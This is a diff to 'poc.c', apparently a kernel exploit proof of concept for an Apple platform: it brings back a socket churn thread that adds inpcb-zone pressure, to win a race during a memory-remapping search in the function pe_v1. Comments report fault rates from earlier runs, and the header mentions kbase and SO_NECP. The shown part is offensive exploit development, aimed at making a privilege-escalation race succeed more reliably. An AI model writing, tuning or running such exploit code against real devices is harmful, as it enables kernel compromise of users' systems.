@@ -1,5 +1,7 @@
 // poc.c
-// Lumina P007OpenOnly - 64788 KRW Focus V25.2 (log quieting)
+// Lumina P007OpenOnly - 64788 KRW Focus V25.3 (churn reinstated)
+// V25: OG ClearSwordCore gates restored (w==-1 + Q0-only), per-page tags,
+// SO_NECP 0x1109, OG kbase ladder, cycler removal
 // V25: OG ClearSwordCore gates restored (w==-1 + Q0-only), per-page tags,
 // SO_NECP 0x1109, OG kbase ladder, cycler/churn removal
 // V44: Anonymous VM cycler (replaces IOSurface cycler), removed mlock
@@ -113,6 +115,17 @@ kern_return_t pe_v1(void) {
         LOG("start_pcb_id: %#llx", start_pcb_id);
         LOG("end_pcb_id: %#llx", end_pcb_id);
 
+        // V25.3: churn thread REINSTATED. Cross-run comparison proved the
+        // socket churn was the EFAULT driver: run WITH churn = 3235 staging
+        // faults/min; v25.1 run without = 0 faults in 960k remaps. Socket
+        // churn = inpcb-zone pressure — the pool-claim side of the race.
+        // The VM cyclers stay deleted (v25's self-echo tag poison came from
+        // them, not from the socket churn).
+        churn_go = 1;
+        pthread_t churn_tid;
+        pthread_create(&churn_tid, NULL, churn_thread, NULL);
+        LOG("socket churn thread started (v25.3 reinstated)");
+
         bool success = false;
         for (size_t s = 0; s < n_of_search_mappings; s++) {
             if (cs_expired()) break;
@@ -188,6 +201,11 @@ kern_return_t pe_v1(void) {
                 break;
             }
         }
+
+        // Stop churn thread
+        churn_go = 0;
+        pthread_join(churn_tid, NULL);
+        LOG("socket churn thread stopped");
 
         sockets_release();
 
